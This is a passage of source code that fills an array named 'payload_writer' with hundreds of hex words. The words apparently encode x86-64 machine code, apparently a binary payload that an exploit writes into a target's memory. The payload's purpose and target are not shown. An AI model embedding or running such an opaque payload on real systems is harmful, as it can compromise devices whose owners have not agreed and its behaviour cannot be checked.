  payload_writer[1329] = 0x29480000;
  payload_writer[1330] = 0xc23948da;
  payload_writer[1331] = 0x8d48267c;
  payload_writer[1332] = 0x0037ab15;
  payload_writer[1333] = 0x0100be00;
  payload_writer[1334] = 0x89480000;
  payload_writer[1335] = 0xffc031ef;
  payload_writer[1336] = 0x003b8b15;
  payload_writer[1337] = 0xef894800;
  payload_writer[1338] = 0xe8e3894c;
  payload_writer[1339] = 0x000012bd;
  payload_writer[1340] = 0xdb3102eb;
  payload_writer[1341] = 0x000001bf;
  payload_writer[1342] = 0xc915ff00;
  payload_writer[1343] = 0xeb000039;
  payload_writer[1344] = 0xc481489e;
  payload_writer[1345] = 0x00000100;
  payload_writer[1346] = 0x5d5bc031;
  payload_writer[1347] = 0x41c35c41;
  payload_writer[1348] = 0xf4894954;
  payload_writer[1349] = 0x358d4855;
  payload_writer[1350] = 0x00002ade;
  payload_writer[1351] = 0xd5894853;
  payload_writer[1352] = 0x4cfb8948;
  payload_writer[1353] = 0x15ffe789;
  payload_writer[1354] = 0x00003c8c;
  payload_writer[1355] = 0x0d75c085;
  payload_writer[1356] = 0xffef8948;
  payload_writer[1357] = 0x003cbf15;
  payload_writer[1358] = 0xeb038900;
  payload_writer[1359] = 0x358d4842;
  payload_writer[1360] = 0x00002abc;
  payload_writer[1361] = 0xffe7894c;
  payload_writer[1362] = 0x003c6b15;
  payload_writer[1363] = 0x75c08500;
  payload_writer[1364] = 0xef89480e;
  payload_writer[1365] = 0x3c9e15ff;
  payload_writer[1366] = 0x43890000;
  payload_writer[1367] = 0x4820eb04;
  payload_writer[1368] = 0x2aa1358d;
  payload_writer[1369] = 0x894c0000;
  payload_writer[1370] = 0x4915ffe7;
  payload_writer[1371] = 0x8500003c;
  payload_writer[1372] = 0x480c75c0;
  payload_writer[1373] = 0x15ffef89;
  payload_writer[1374] = 0x00003c7c;
  payload_writer[1375] = 0x5b084389;
  payload_writer[1376] = 0x000001b8;
  payload_writer[1377] = 0x5c415d00;
  payload_writer[1378] = 0x415741c3;
  payload_writer[1379] = 0x41554156;
  payload_writer[1380] = 0x48535554;
  payload_writer[1381] = 0x02d8ec81;
  payload_writer[1382] = 0x89480000;
  payload_writer[1383] = 0x6c8d4cf9;
  payload_writer[1384] = 0x89481024;
  payload_writer[1385] = 0x48c031f2;
  payload_writer[1386] = 0x2a62358d;
  payload_writer[1387] = 0x8d4c0000;
  payload_writer[1388] = 0x019024b4;
  payload_writer[1389] = 0x89480000;
  payload_writer[1390] = 0xef894cfb;
  payload_writer[1391] = 0x24ac8d48;
  payload_writer[1392] = 0x000000d0;
  payload_writer[1393] = 0x3c0615ff;
  payload_writer[1394] = 0x8d480000;
  payload_writer[1395] = 0x01502484;
  payload_writer[1396] = 0x894c0000;
  payload_writer[1397] = 0xc78948ea;
  payload_writer[1398] = 0x24448948;
  payload_writer[1399] = 0x358d4808;
  payload_writer[1400] = 0x00002a32;
  payload_writer[1401] = 0x15ffc031;
  payload_writer[1402] = 0x00003be4;
  payload_writer[1403] = 0x48ea894c;
  payload_writer[1404] = 0x2a2b358d;
  payload_writer[1405] = 0x894c0000;
  payload_writer[1406] = 0xffc031f7;
  payload_writer[1407] = 0x003bcf15;
  payload_writer[1408] = 0xf7894c00;
  payload_writer[1409] = 0x24a48d4c;
  payload_writer[1410] = 0x00000110;
  payload_writer[1411] = 0x00126ae8;
  payload_writer[1412] = 0x7c8b4800;
  payload_writer[1413] = 0x59e80824;
  payload_writer[1414] = 0x83000013;
  payload_writer[1415] = 0x00385e3d;
  payload_writer[1416] = 0x894c0000;
  payload_writer[1417] = 0x0d8b48ea;
  payload_writer[1418] = 0x00003ba4;
  payload_writer[1419] = 0x8d484c74;
  payload_writer[1420] = 0x0029f835;
  payload_writer[1421] = 0xef894800;
  payload_writer[1422] = 0xd1ffc031;
  payload_writer[1423] = 0x894cc031;
  payload_writer[1424] = 0x358d48ea;
  payload_writer[1425] = 0x000029ec;
  payload_writer[1426] = 0xffe7894c;
  payload_writer[1427] = 0x003b7f15;
  payload_writer[1428] = 0x2805f600;
  payload_writer[1429] = 0x01000038;
  payload_writer[1430] = 0xffbe0d74;
  payload_writer[1431] = 0x48000001;
  payload_writer[1432] = 0x8ce8ef89;
  payload_writer[1433] = 0xf6000012;
  payload_writer[1434] = 0x00381205;
  payload_writer[1435] = 0x3a740200;
  payload_writer[1436] = 0x0001ffbe;
  payload_writer[1437] = 0xe7894c00;
  payload_writer[1438] = 0x8d482beb;
  payload_writer[1439] = 0x002c5e35;
  payload_writer[1440] = 0xef894800;
  payload_writer[1441] = 0xd1ffc031;
  payload_writer[1442] = 0x50358d48;
  payload_writer[1443] = 0x4c00002c;
  payload_writer[1444] = 0x894ce789;
  payload_writer[1445] = 0xffc031ea;
  payload_writer[1446] = 0x003b3315;
  payload_writer[1447] = 0x01ffbe00;
  payload_writer[1448] = 0x894c0000;
  payload_writer[1449] = 0x1249e8ef;
  payload_writer[1450] = 0x058b0000;
  payload_writer[1451] = 0x000037d0;
  payload_writer[1452] = 0x0874c085;
  payload_writer[1453] = 0x840f01a8;
  payload_writer[1454] = 0x000000be;
  payload_writer[1455] = 0x246c8d4c;
  payload_writer[1456] = 0xbc8d4c50;
  payload_writer[1457] = 0x0001d024;
  payload_writer[1458] = 0xda894800;
  payload_writer[1459] = 0x6a358d48;
  payload_writer[1460] = 0x4c000029;
  payload_writer[1461] = 0xc031ef89;
  payload_writer[1462] = 0x3af215ff;
  payload_writer[1463] = 0x8d480000;
  payload_writer[1464] = 0x00296d15;
  payload_writer[1465] = 0x0100be00;
  payload_writer[1466] = 0x894c0000;
  payload_writer[1467] = 0xffc031ff;
  payload_writer[1468] = 0x00397b15;
  payload_writer[1469] = 0xff894c00;
  payload_writer[1470] = 0x24bc8d4c;
  payload_writer[1471] = 0x00000090;
  payload_writer[1472] = 0x0010a8e8;
  payload_writer[1473] = 0xee894800;
  payload_writer[1474] = 0xe8ef894c;
  payload_writer[1475] = 0x0000095b;
  payload_writer[1476] = 0x48da8948;
  payload_writer[1477] = 0x2952358d;
  payload_writer[1478] = 0x894c0000;
  payload_writer[1479] = 0xffc031ef;
  payload_writer[1480] = 0x003aab15;
  payload_writer[1481] = 0xea894800;
  payload_writer[1482] = 0x66358d48;
  payload_writer[1483] = 0x4c000029;
  payload_writer[1484] = 0xc031ff89;
  payload_writer[1485] = 0x3a9615ff;
  payload_writer[1486] = 0x894c0000;
  payload_writer[1487] = 0xef894cfe;
  payload_writer[1488] = 0x00124ee8;
  payload_writer[1489] = 0xda894800;
  payload_writer[1490] = 0x5d358d48;
  payload_writer[1491] = 0x4c000029;
  payload_writer[1492] = 0xc031ef89;
  payload_writer[1493] = 0x3a7615ff;
  payload_writer[1494] = 0x8d480000;
  payload_writer[1495] = 0x00297335;
  payload_writer[1496] = 0xff894c00;
  payload_writer[1497] = 0x31ea8948;
  payload_writer[1498] = 0x6115ffc0;
  payload_writer[1499] = 0x4c00003a;
  payload_writer[1500] = 0x894cfe89;
  payload_writer[1501] = 0x1219e8ef;
  payload_writer[1502] = 0x058b0000;
  payload_writer[1503] = 0x00003700;
  payload_writer[1504] = 0x0874c085;
  payload_writer[1505] = 0x840f02a8;
  payload_writer[1506] = 0x000000eb;
  payload_writer[1507] = 0x246c8d4c;
  payload_writer[1508] = 0xda894850;
  payload_writer[1509] = 0x4f358d48;
  payload_writer[1510] = 0x4c000029;
  payload_writer[1511] = 0xc031ef89;
  payload_writer[1512] = 0x3a2a15ff;
  payload_writer[1513] = 0x894c0000;
  payload_writer[1514] = 0x11a5e8ef;
  payload_writer[1515] = 0xc0850000;
  payload_writer[1516] = 0x00b7840f;
  payload_writer[1517] = 0x3d830000;
  payload_writer[1518] = 0x000036c3;
  payload_writer[1519] = 0x158d4800;
  payload_writer[1520] = 0x0000293f;
  payload_writer[1521] = 0x24bc8d4c;
  payload_writer[1522] = 0x000001d0;
  payload_writer[1523] = 0x9d0d8b48;
  payload_writer[1524] = 0x75000038;
  payload_writer[1525] = 0x158d4807;
  payload_writer[1526] = 0x00002943;
  payload_writer[1527] = 0x000100be;
  payload_writer[1528] = 0xff894c00;
  payload_writer[1529] = 0xd1ffc031;
  payload_writer[1530] = 0x4cff894c;
  payload_writer[1531] = 0x9024bc8d;
  payload_writer[1532] = 0xe8000000;
  payload_writer[1533] = 0x00000fb5;
  payload_writer[1534] = 0x4ce6894c;
  payload_writer[1535] = 0x68e8ef89;
  payload_writer[1536] = 0x48000008;
  payload_writer[1537] = 0x8d48da89;
  payload_writer[1538] = 0x00285f35;
  payload_writer[1539] = 0xef894c00;
  payload_writer[1540] = 0x15ffc031;
  payload_writer[1541] = 0x000039b8;
  payload_writer[1542] = 0x48e2894c;
  payload_writer[1543] = 0x2873358d;
  payload_writer[1544] = 0x894c0000;
  payload_writer[1545] = 0xffc031ff;
  payload_writer[1546] = 0x0039a315;
  payload_writer[1547] = 0xfe894c00;
  payload_writer[1548] = 0xe8ef894c;
  payload_writer[1549] = 0x0000115b;
  payload_writer[1550] = 0x48da8948;
  payload_writer[1551] = 0x286a358d;
  payload_writer[1552] = 0x894c0000;
  payload_writer[1553] = 0xffc031ef;
  payload_writer[1554] = 0x00398315;
  payload_writer[1555] = 0x358d4800;
  payload_writer[1556] = 0x00002880;
  payload_writer[1557] = 0x4cff894c;
  payload_writer[1558] = 0xc031e289;
  payload_writer[1559] = 0x396e15ff;
  payload_writer[1560] = 0x894c0000;
  payload_writer[1561] = 0xef894cfe;
  payload_writer[1562] = 0x001126e8;
  payload_writer[1563] = 0x0d058b00;
  payload_writer[1564] = 0x85000036;
  payload_writer[1565] = 0xa80474c0;
  payload_writer[1566] = 0x4c4c7401;
  payload_writer[1567] = 0x50246c8d;
  payload_writer[1568] = 0x24bc8d4c;
  payload_writer[1569] = 0x000001d0;
  payload_writer[1570] = 0x48da8948;
  payload_writer[1571] = 0x28a6358d;
  payload_writer[1572] = 0x894c0000;
  payload_writer[1573] = 0xffc031ef;
  payload_writer[1574] = 0x00393315;
  payload_writer[1575] = 0x0100be00;
  payload_writer[1576] = 0x8d480000;
  payload_writer[1577] = 0x0028be15;
  payload_writer[1578] = 0xff894c00;
  payload_writer[1579] = 0x15ffc031;
  payload_writer[1580] = 0x000037bc;
  payload_writer[1581] = 0xe8ff894c;
  payload_writer[1582] = 0x00000ef1;
  payload_writer[1583] = 0x4cee8948;
  payload_writer[1584] = 0x57e8ef89;
  payload_writer[1585] = 0x8b000025;
  payload_writer[1586] = 0x0035b305;
  payload_writer[1587] = 0x74c08500;
  payload_writer[1588] = 0x7402a804;
  payload_writer[1589] = 0x7c8d4c75;
  payload_writer[1590] = 0x89485024;
  payload_writer[1591] = 0x358d48da;
  payload_writer[1592] = 0x0000289b;
  payload_writer[1593] = 0x31ff894c;
  payload_writer[1594] = 0xe115ffc0;
  payload_writer[1595] = 0x4c000038;
  payload_writer[1596] = 0x5ce8ff89;
  payload_writer[1597] = 0x85000010;
  payload_writer[1598] = 0x834574c0;
  payload_writer[1599] = 0x00357e3d;
  payload_writer[1600] = 0x8d480000;
  payload_writer[1601] = 0x0028a715;
  payload_writer[1602] = 0xac8d4c00;
  payload_writer[1603] = 0x0001d024;
  payload_writer[1604] = 0x0d8b4800;
  payload_writer[1605] = 0x00003758;
  payload_writer[1606] = 0x8d480775;
  payload_writer[1607] = 0x0028a915;
  payload_writer[1608] = 0x0100be00;
  payload_writer[1609] = 0x894c0000;
  payload_writer[1610] = 0xffc031ef;
  payload_writer[1611] = 0xef894cd1;
  payload_writer[1612] = 0x000e78e8;
  payload_writer[1613] = 0xe6894c00;
  payload_writer[1614] = 0xe8ff894c;
  payload_writer[1615] = 0x000024de;
  payload_writer[1616] = 0x353a058b;
  payload_writer[1617] = 0xc0850000;
  payload_writer[1618] = 0x01a80474;
  payload_writer[1619] = 0x8d4c4c74;
  payload_writer[1620] = 0x4c50246c;
  payload_writer[1621] = 0xd024bc8d;
  payload_writer[1622] = 0x48000001;
  payload_writer[1623] = 0x8d48da89;
  payload_writer[1624] = 0x00287735;
  payload_writer[1625] = 0xef894c00;
  payload_writer[1626] = 0x15ffc031;
  payload_writer[1627] = 0x00003860;
  payload_writer[1628] = 0x000100be;
  payload_writer[1629] = 0x158d4800;
  payload_writer[1630] = 0x0000287c;
  payload_writer[1631] = 0x31ff894c;
  payload_writer[1632] = 0xe915ffc0;
  payload_writer[1633] = 0x4c000036;
  payload_writer[1634] = 0x1ee8ff89;
  payload_writer[1635] = 0x4800000e;
  payload_writer[1636] = 0x894cee89;
  payload_writer[1637] = 0x14e7e8ef;
  payload_writer[1638] = 0x058b0000;
  payload_writer[1639] = 0x000034e0;
  payload_writer[1640] = 0x0474c085;
  payload_writer[1641] = 0x587402a8;
  payload_writer[1642] = 0x246c8d48;
  payload_writer[1643] = 0xda894850;
  payload_writer[1644] = 0x55358d48;
  payload_writer[1645] = 0x48000028;
  payload_writer[1646] = 0xc031ef89;
  payload_writer[1647] = 0x380e15ff;
  payload_writer[1648] = 0x89480000;
  payload_writer[1649] = 0x0f89e8ef;
  payload_writer[1650] = 0xc0850000;
  payload_writer[1651] = 0x8d483274;
  payload_writer[1652] = 0x01d0249c;
  payload_writer[1653] = 0x00be0000;
  payload_writer[1654] = 0x48000001;
  payload_writer[1655] = 0x2848158d;
  payload_writer[1656] = 0x89480000;
  payload_writer[1657] = 0xffc031df;
  payload_writer[1658] = 0x00368315;
  payload_writer[1659] = 0xdf894800;
  payload_writer[1660] = 0x000db8e8;
  payload_writer[1661] = 0xe6894c00;
  payload_writer[1662] = 0xe8ef8948;
  payload_writer[1663] = 0x00001481;
  payload_writer[1664] = 0x247c8b48;
  payload_writer[1665] = 0x0e71e808;
  payload_writer[1666] = 0x894c0000;
  payload_writer[1667] = 0x0f62e8f7;
  payload_writer[1668] = 0x81480000;
  payload_writer[1669] = 0x0002d8c4;
  payload_writer[1670] = 0x415d5b00;
  payload_writer[1671] = 0x415d415c;
  payload_writer[1672] = 0xc35f415e;
  payload_writer[1673] = 0x55415641;
  payload_writer[1674] = 0x53555441;
  payload_writer[1675] = 0x10ec8148;
  payload_writer[1676] = 0xe8000002;
  payload_writer[1677] = 0x00000275;
  payload_writer[1678] = 0x001c1ce8;
  payload_writer[1679] = 0x1a6fe800;
  payload_writer[1680] = 0xbce80000;
  payload_writer[1681] = 0x48fffff9;
  payload_writer[1682] = 0x10249c8d;
  payload_writer[1683] = 0x4c000001;
  payload_writer[1684] = 0x9024a48d;
  payload_writer[1685] = 0x48000000;
  payload_writer[1686] = 0x8d4cc789;
  payload_writer[1687] = 0xe850246c;
  payload_writer[1688] = 0xfffffa0a;
  payload_writer[1689] = 0x000cdee8;
  payload_writer[1690] = 0x0d05c700;
  payload_writer[1691] = 0x03000034;
  payload_writer[1692] = 0x31000000;
  payload_writer[1693] = 0x0505c7c9;
  payload_writer[1694] = 0x3c000034;
  payload_writer[1695] = 0x4c000000;
  payload_writer[1696] = 0x27b8058d;
  payload_writer[1697] = 0x05c70000;
  payload_writer[1698] = 0x000033f8;
  payload_writer[1699] = 0x00000001;
  payload_writer[1700] = 0x05c7f631;
  payload_writer[1701] = 0x000031c4;
  payload_writer[1702] = 0x00000001;
  payload_writer[1703] = 0x247c8d48;
  payload_writer[1704] = 0xd805c608;
  payload_writer[1705] = 0x00000031;
  payload_writer[1706] = 0xe0158d48;
  payload_writer[1707] = 0xfffffff9;
  payload_writer[1708] = 0x00359315;
  payload_writer[1709] = 0x158d4800;
  payload_writer[1710] = 0x0000278a;
  payload_writer[1711] = 0x000100be;
  payload_writer[1712] = 0xdf894800;
  payload_writer[1713] = 0x15ffc031;
  payload_writer[1714] = 0x000035a4;
  payload_writer[1715] = 0xe8df8948;
  payload_writer[1716] = 0x00000cd9;
  payload_writer[1717] = 0x000005bf;
  payload_writer[1718] = 0xe915ff00;
  payload_writer[1719] = 0x4c000033;
  payload_writer[1720] = 0x894ce689;
  payload_writer[1721] = 0x1636e8ef;
  payload_writer[1722] = 0xc0850000;
  payload_writer[1723] = 0x8d483575;
  payload_writer[1724] = 0x00276735;
  payload_writer[1725] = 0x3d8d4800;
  payload_writer[1726] = 0x00003184;
  payload_writer[1727] = 0x36ce15ff;
  payload_writer[1728] = 0x01bf0000;
  payload_writer[1729] = 0xff000000;
  payload_writer[1730] = 0x0033bb15;
  payload_writer[1731] = 0xe6894c00;
  payload_writer[1732] = 0xe8ef894c;
  payload_writer[1733] = 0x00001608;
  payload_writer[1734] = 0xe674c085;
  payload_writer[1735] = 0x315d05c6;
  payload_writer[1736] = 0x48000000;
  payload_writer[1737] = 0xd024ac8d;
  payload_writer[1738] = 0x4c000000;
  payload_writer[1739] = 0x8948e289;
  payload_writer[1740] = 0x358d48ef;
  payload_writer[1741] = 0x0000273c;
  payload_writer[1742] = 0x15ffc031;
  payload_writer[1743] = 0x00003690;
  payload_writer[1744] = 0x48ef8948;
  payload_writer[1745] = 0x3336158d;
  payload_writer[1746] = 0x8d480000;
  payload_writer[1747] = 0xfff9be35;
  payload_writer[1748] = 0x6c8d48ff;
  payload_writer[1749] = 0x0ce81024;
  payload_writer[1750] = 0x48000019;
  payload_writer[1751] = 0x50e8ef89;
  payload_writer[1752] = 0x85000014;
  payload_writer[1753] = 0x483275c0;
  payload_writer[1754] = 0x2714358d;
  payload_writer[1755] = 0x8d480000;
  payload_writer[1756] = 0x00310b3d;
  payload_writer[1757] = 0x5515ff00;
  payload_writer[1758] = 0xbf000036;
  payload_writer[1759] = 0x00000001;
  payload_writer[1760] = 0x334215ff;
  payload_writer[1761] = 0x89480000;
  payload_writer[1762] = 0x1425e8ef;
  payload_writer[1763] = 0xc0850000;
  payload_writer[1764] = 0x05c6e974;
  payload_writer[1765] = 0x000030e7;
  payload_writer[1766] = 0xef894800;
  payload_writer[1767] = 0x0014ade8;
  payload_writer[1768] = 0x63f88300;
  payload_writer[1769] = 0x01bf3b7f;
  payload_writer[1770] = 0xff000000;
  payload_writer[1771] = 0x00331715;
  payload_writer[1772] = 0xef894800;
  payload_writer[1773] = 0x001495e8;
  payload_writer[1774] = 0x358d4800;
  payload_writer[1775] = 0x000026e0;
  payload_writer[1776] = 0xb93d8d48;
  payload_writer[1777] = 0x41000030;
  payload_writer[1778] = 0xc289c689;
  payload_writer[1779] = 0x15ffc031;
  payload_writer[1780] = 0x000035fc;
  payload_writer[1781] = 0x63fe8341;
  payload_writer[1782] = 0x05c6cc7e;
  payload_writer[1783] = 0x0000309f;
  payload_writer[1784] = 0xe8894d00;
  payload_writer[1785] = 0x48e98948;
  payload_writer[1786] = 0x26dd158d;
  payload_writer[1787] = 0x00be0000;
  payload_writer[1788] = 0x48000001;
  payload_writer[1789] = 0xc031df89;
  payload_writer[1790] = 0x347215ff;
  payload_writer[1791] = 0x89480000;
  payload_writer[1792] = 0x0ba7e8df;
  payload_writer[1793] = 0x05bf0000;
  payload_writer[1794] = 0xff000000;
  payload_writer[1795] = 0x0032b715;
  payload_writer[1796] = 0xe6894c00;
  payload_writer[1797] = 0xe8ef8948;
  payload_writer[1798] = 0xfffff96d;
  payload_writer[1799] = 0x32653d83;
  payload_writer[1800] = 0x48000000;
  payload_writer[1801] = 0x8d48e989;
  payload_writer[1802] = 0x0026b515;
  payload_writer[1803] = 0x058b4c00;
  payload_writer[1804] = 0x0000343c;
  payload_writer[1805] = 0x8d480775;
  payload_writer[1806] = 0x0026c115;
  payload_writer[1807] = 0x0100be00;
  payload_writer[1808] = 0x89480000;
  payload_writer[1809] = 0x41c031df;
  payload_writer[1810] = 0x8948d0ff;
  payload_writer[1811] = 0x0b5be8df;
  payload_writer[1812] = 0x0abf0000;
  payload_writer[1813] = 0xff000000;
  payload_writer[1814] = 0x00326b15;
  payload_writer[1815] = 0x243d8300;
  payload_writer[1816] = 0x00000032;
  payload_writer[1817] = 0x2ff205c7;
  payload_writer[1818] = 0x00000000;
  payload_writer[1819] = 0x07740000;
  payload_writer[1820] = 0x6ae8c031;
  payload_writer[1821] = 0x4800000b;
  payload_writer[1822] = 0x0210c481;
  payload_writer[1823] = 0xc0310000;
  payload_writer[1824] = 0x5c415d5b;
  payload_writer[1825] = 0x5e415d41;
  payload_writer[1826] = 0xc0c748c3;
  payload_writer[1827] = 0x00000025;
  payload_writer[1828] = 0x00233ae9;
  payload_writer[1829] = 0xc0c74800;
  payload_writer[1830] = 0x00000036;
  payload_writer[1831] = 0x00232ee9;
  payload_writer[1832] = 0xc0c74800;
  payload_writer[1833] = 0x0000000b;
  payload_writer[1834] = 0x002322e9;
  payload_writer[1835] = 0x358d4800;
  payload_writer[1836] = 0x000031ec;
  payload_writer[1837] = 0x3d8d4852;
  payload_writer[1838] = 0x00002c59;
  payload_writer[1839] = 0x5905c748;
  payload_writer[1840] = 0x00000032;
  payload_writer[1841] = 0xe8000000;
  payload_writer[1842] = 0x00000b65;
  payload_writer[1843] = 0x2a74c085;
  payload_writer[1844] = 0xc9358d48;
  payload_writer[1845] = 0x48000031;
  payload_writer[1846] = 0x26303d8d;
  payload_writer[1847] = 0x4ee80000;
  payload_writer[1848] = 0x8500000b;
  payload_writer[1849] = 0x481374c0;
  payload_writer[1850] = 0x31b2358d;
  payload_writer[1851] = 0x8d480000;
  payload_writer[1852] = 0x00262c3d;
  payload_writer[1853] = 0x0b37e800;
  payload_writer[1854] = 0x3d8b0000;
  payload_writer[1855] = 0x000031a0;
  payload_writer[1856] = 0xa1158d48;
  payload_writer[1857] = 0x48000031;
  payload_writer[1858] = 0x2626358d;
  payload_writer[1859] = 0x06e80000;
  payload_writer[1860] = 0x8b00000b;
  payload_writer[1861] = 0x0031873d;
  payload_writer[1862] = 0x158d4800;
  payload_writer[1863] = 0x000031c8;
  payload_writer[1864] = 0x1f358d48;
  payload_writer[1865] = 0xe8000026;
  payload_writer[1866] = 0x00000aed;
  payload_writer[1867] = 0x316e3d8b;
  payload_writer[1868] = 0x8d480000;
  payload_writer[1869] = 0x0031e715;
  payload_writer[1870] = 0x358d4800;
  payload_writer[1871] = 0x00002617;
  payload_writer[1872] = 0x000ad4e8;
  payload_writer[1873] = 0x553d8b00;
  payload_writer[1874] = 0x48000031;
  payload_writer[1875] = 0x31ae158d;
  payload_writer[1876] = 0x8d480000;
  payload_writer[1877] = 0x00260635;
  payload_writer[1878] = 0x0abbe800;
  payload_writer[1879] = 0x3d8b0000;
  payload_writer[1880] = 0x0000313c;
  payload_writer[1881] = 0xd5158d48;
  payload_writer[1882] = 0x48000031;
  payload_writer[1883] = 0x25fc358d;
  payload_writer[1884] = 0xa2e80000;
  payload_writer[1885] = 0x8b00000a;
  payload_writer[1886] = 0x0031233d;
  payload_writer[1887] = 0x158d4800;
  payload_writer[1888] = 0x000031e4;
  payload_writer[1889] = 0xfc358d48;
  payload_writer[1890] = 0xe8000025;
  payload_writer[1891] = 0x00000a89;
  payload_writer[1892] = 0x310a3d8b;
  payload_writer[1893] = 0x8d480000;
  payload_writer[1894] = 0x00315315;
  payload_writer[1895] = 0x358d4800;
  payload_writer[1896] = 0x00002601;
  payload_writer[1897] = 0x000a70e8;
  payload_writer[1898] = 0xf13d8b00;
  payload_writer[1899] = 0x48000030;
  payload_writer[1900] = 0x30fa158d;
  payload_writer[1901] = 0x8d480000;
  payload_writer[1902] = 0x00260135;
  payload_writer[1903] = 0x0a57e800;
  payload_writer[1904] = 0x3d8b0000;
  payload_writer[1905] = 0x000030d8;
  payload_writer[1906] = 0x69158d48;
  payload_writer[1907] = 0x48000031;
  payload_writer[1908] = 0x2605358d;
  payload_writer[1909] = 0x3ee80000;
  payload_writer[1910] = 0x8b00000a;
  payload_writer[1911] = 0x0030bf3d;
  payload_writer[1912] = 0x158d4800;
  payload_writer[1913] = 0x000031a8;
  payload_writer[1914] = 0xfa358d48;
  payload_writer[1915] = 0xe8000025;
  payload_writer[1916] = 0x00000a25;
  payload_writer[1917] = 0x30a63d8b;
  payload_writer[1918] = 0x8d480000;
  payload_writer[1919] = 0x00310f15;
  payload_writer[1920] = 0x358d4800;
  payload_writer[1921] = 0x000025ef;
  payload_writer[1922] = 0x000a0ce8;
  payload_writer[1923] = 0x8d3d8b00;
  payload_writer[1924] = 0x48000030;
  payload_writer[1925] = 0x3116158d;
  payload_writer[1926] = 0x8d480000;
  payload_writer[1927] = 0x0025e435;
  payload_writer[1928] = 0x09f3e800;
  payload_writer[1929] = 0x3d8b0000;
  payload_writer[1930] = 0x00003074;
  payload_writer[1931] = 0x15158d48;
  payload_writer[1932] = 0x48000031;
  payload_writer[1933] = 0x25da358d;
  payload_writer[1934] = 0xdae80000;
  payload_writer[1935] = 0x8b000009;
  payload_writer[1936] = 0x00305b3d;
  payload_writer[1937] = 0x158d4800;
  payload_writer[1938] = 0x0000307c;
  payload_writer[1939] = 0xd0358d48;
  payload_writer[1940] = 0xe8000025;
  payload_writer[1941] = 0x000009c1;
  payload_writer[1942] = 0x30423d8b;
  payload_writer[1943] = 0x8d480000;
  payload_writer[1944] = 0x00310b15;
  payload_writer[1945] = 0x358d4800;
  payload_writer[1946] = 0x000025c6;
  payload_writer[1947] = 0x0009a8e8;
  payload_writer[1948] = 0x293d8b00;
  payload_writer[1949] = 0x48000030;
  payload_writer[1950] = 0x3012158d;
  payload_writer[1951] = 0x8d480000;
  payload_writer[1952] = 0x0025bd35;
  payload_writer[1953] = 0x098fe800;
  payload_writer[1954] = 0x3d8b0000;
  payload_writer[1955] = 0x00003010;
  payload_writer[1956] = 0xc1158d48;
  payload_writer[1957] = 0x48000030;
  payload_writer[1958] = 0x25ba358d;
  payload_writer[1959] = 0x76e80000;
  payload_writer[1960] = 0x8b000009;
  payload_writer[1961] = 0x002ff73d;
  payload_writer[1962] = 0x158d4800;
  payload_writer[1963] = 0x00003020;
  payload_writer[1964] = 0xb9358d48;
  payload_writer[1965] = 0xe8000025;
  payload_writer[1966] = 0x0000095d;
  payload_writer[1967] = 0x2fde3d8b;
  payload_writer[1968] = 0x8d480000;
  payload_writer[1969] = 0x00303f15;
  payload_writer[1970] = 0x358d4800;
  payload_writer[1971] = 0x000025b7;
  payload_writer[1972] = 0x000944e8;
  payload_writer[1973] = 0xc53d8b00;
  payload_writer[1974] = 0x4800002f;
  payload_writer[1975] = 0x30c6158d;
  payload_writer[1976] = 0x8d480000;
  payload_writer[1977] = 0x0025a535;
  payload_writer[1978] = 0x092be800;
  payload_writer[1979] = 0x3d8b0000;
  payload_writer[1980] = 0x00002fac;
  payload_writer[1981] = 0xfd158d48;
  payload_writer[1982] = 0x4800002f;
  payload_writer[1983] = 0x2599358d;
  payload_writer[1984] = 0x12e80000;
  payload_writer[1985] = 0x8b000009;
  payload_writer[1986] = 0x002f933d;
  payload_writer[1987] = 0x158d4800;
  payload_writer[1988] = 0x00002fa4;
  payload_writer[1989] = 0x88358d48;
  payload_writer[1990] = 0xe8000025;
  payload_writer[1991] = 0x000008f9;
  payload_writer[1992] = 0x2f7a3d8b;
  payload_writer[1993] = 0x8d480000;
  payload_writer[1994] = 0x00305315;
  payload_writer[1995] = 0x358d4800;
  payload_writer[1996] = 0x00002576;
  payload_writer[1997] = 0x0008e0e8;
  payload_writer[1998] = 0x613d8b00;
  payload_writer[1999] = 0x4800002f;
  payload_writer[2000] = 0x300a158d;
  payload_writer[2001] = 0x8d480000;
  payload_writer[2002] = 0x00256a35;
  payload_writer[2003] = 0x08c7e800;
  payload_writer[2004] = 0x3d8b0000;
  payload_writer[2005] = 0x00002f48;
  payload_writer[2006] = 0x29158d48;
  payload_writer[2007] = 0x48000030;
  payload_writer[2008] = 0x2568358d;
  payload_writer[2009] = 0xaee80000;
  payload_writer[2010] = 0x8b000008;
  payload_writer[2011] = 0x002f2f3d;
  payload_writer[2012] = 0x158d4800;
  payload_writer[2013] = 0x00002f60;
  payload_writer[2014] = 0x65358d48;
  payload_writer[2015] = 0xe8000025;
  payload_writer[2016] = 0x00000895;
  payload_writer[2017] = 0x2f163d8b;
  payload_writer[2018] = 0x8d480000;
  payload_writer[2019] = 0x002fe715;
  payload_writer[2020] = 0x358d4800;
  payload_writer[2021] = 0x00002562;
  payload_writer[2022] = 0x00087ce8;
  payload_writer[2023] = 0xfd3d8b00;
  payload_writer[2024] = 0x4800002e;
  payload_writer[2025] = 0x2ff6158d;
  payload_writer[2026] = 0x8d480000;
  payload_writer[2027] = 0x00255f35;
  payload_writer[2028] = 0x0863e800;
  payload_writer[2029] = 0x3d8b0000;
  payload_writer[2030] = 0x00002ee4;
  payload_writer[2031] = 0x1d158d48;
  payload_writer[2032] = 0x4800002f;
  payload_writer[2033] = 0x255c358d;
  payload_writer[2034] = 0x4ae80000;
  payload_writer[2035] = 0x8b000008;
  payload_writer[2036] = 0x002ecb3d;
  payload_writer[2037] = 0x158d4800;
  payload_writer[2038] = 0x00002ebc;
  payload_writer[2039] = 0x4a358d48;
  payload_writer[2040] = 0xe8000025;
  payload_writer[2041] = 0x00000831;
  payload_writer[2042] = 0x2eb23d8b;
  payload_writer[2043] = 0x8d480000;
  payload_writer[2044] = 0x002ecb15;
  payload_writer[2045] = 0x358d4800;
  payload_writer[2046] = 0x00002538;
  payload_writer[2047] = 0x000818e8;
  payload_writer[2048] = 0x993d8b00;
  payload_writer[2049] = 0x4800002e;
  payload_writer[2050] = 0x2f8a158d;
  payload_writer[2051] = 0x8d480000;
  payload_writer[2052] = 0x00252635;
  payload_writer[2053] = 0x07ffe800;
  payload_writer[2054] = 0x3d8b0000;
  payload_writer[2055] = 0x00002e80;
  payload_writer[2056] = 0x01158d48;
  payload_writer[2057] = 0x4800002f;
  payload_writer[2058] = 0x2514358d;
  payload_writer[2059] = 0xe6e80000;
  payload_writer[2060] = 0x8b000007;
  payload_writer[2061] = 0x002e673d;
